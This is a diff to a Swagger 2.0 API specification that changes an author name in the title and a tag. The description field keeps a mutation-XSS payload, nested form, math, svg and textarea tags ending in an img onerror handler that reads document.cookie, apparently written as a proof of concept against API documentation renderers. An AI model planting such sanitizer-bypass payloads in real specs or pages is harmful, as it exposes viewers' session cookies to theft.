@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: XSS Attack BY MAximus
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
@@ -20,7 +20,7 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - XSS
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
